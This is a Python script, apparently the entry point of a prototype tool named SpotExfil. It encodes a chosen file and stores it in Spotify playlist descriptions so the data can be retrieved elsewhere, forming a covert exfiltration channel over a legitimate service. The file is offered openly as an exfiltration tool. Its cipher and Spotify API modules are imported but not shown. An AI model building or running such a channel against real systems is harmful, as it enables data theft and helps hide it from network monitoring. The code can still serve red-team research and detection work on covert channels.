#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SpotExfil - A data exfiltration tool using Spotify playlists.

Written by: Jean-Michel Amblat (@Sourcefrenchy)
Status:     PROTOTYPE/UGLY ALPHA.

This tool is a quick and dirty way to save/retrieve a payload
using Spotify API and playlists. 1 playlist every 300 bytes as per
the limitation in the description field.

Pre-requisites:
* Do not exceed 300 bytes - will add this at a later time.
* A valid Spotify API setup, will need:
            self.username = os.environ["SPOTIFY_USERNAME"]
            self.redirect_uri = os.environ["SPOTIFY_REDIRECTURI"]
            self.client_id = os.environ["SPOTIFY_CLIENT_ID"]
            self.client_secret = os.environ["SPOTIFY_CLIENT_SECRET"]

Todo:
    * Peer-review of code by a real Python dev to simplify/optimize!

"""
import encoding
import optparse
import spotapi as spot


__author__ = '@sourcefrenchy'
__copyright__ = 'none'
__email__ = 'jeanmichel.amblat@gmail.com'
__status__ = 'PROTOTYPE'


def set_options():
    """Define options for the program."""
    parser = optparse.OptionParser()
    parser.add_option("-c", "--clear", action="store_true", default=False, help="Clear all playlists.")
    parser.add_option("-f", "--file", action="store",
            dest="file", help="Send a file")
    parser.add_option("-r", "--receive", action="store_true",
            help="Receive a file")
    (options, _) = parser.parse_args()
    if options.file is None and options.receive is False\
            and options.clear is False:
        print(parser.parse_args(['--help']))
    else:
        return options


if __name__ == "__main__":
    options = set_options()
    S = spot.Spot()
    C = encoding.Subcipher(S)

    if options.file:
        S.clear_data()
        encoded = C.encode_payload(options.file)
        S.populate_playlist(encoded)
    elif options.receive:
        results = S.retrieve_playlist()
        decoded = C.decode_payload(results)
        if decoded:
            print(decoded)
